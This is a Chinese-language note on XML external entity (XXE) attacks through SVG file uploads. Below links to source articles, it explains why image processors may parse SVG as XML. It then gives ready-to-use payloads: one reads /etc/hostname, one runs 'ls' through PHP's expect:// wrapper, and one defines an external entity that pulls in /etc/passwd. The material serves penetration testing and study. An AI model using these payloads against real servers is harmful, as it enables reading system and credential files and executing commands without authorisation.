# 文章
[XML外部实体注入（XXE）攻击方式汇总 - 跳跳糖](https://tttang.com/archive/1813/)<br />[XML外部实体注入（XXE）攻击方式汇总](https://mp.weixin.qq.com/s/4vc1Ee1qjrbyy-0dRHAlNw)<br />[XML外部实体注入（XXE）攻击方式汇总.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1689494214508-cdf0cf4b-6757-461f-958d-bba1041d655f.pdf)
# Hidden XXE Surfaces
### SVG - File Upload
一些应用程序允许用户上传文件，然后在服务器端进行处理。一些常见的文件格式使用XML或包含XML子组件。基于XML的格式有DOCX等办公文档格式和SVG等图像格式。<br />例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收PNG或JPEG等格式，正在使用的图像处理库也可能支持SVG图像。由于SVG格式使用XML，所以攻击者可以提交恶意SVG图像，从而进行XXE攻击。
```powershell
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
	<image xlink:href="file:///etc/hostname"></image>
</svg>
```
您还可以尝试使用PHP “expect”包装器执行命令：
```powershell
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```
需要注意的是，读取文件或执行结果的第一行将出现在创建的图像内。因此，您需要能够访问SVG创建的图像。
#### 其他payload
```powershell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///etc/passwd" >
]>
<svg height="100" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```
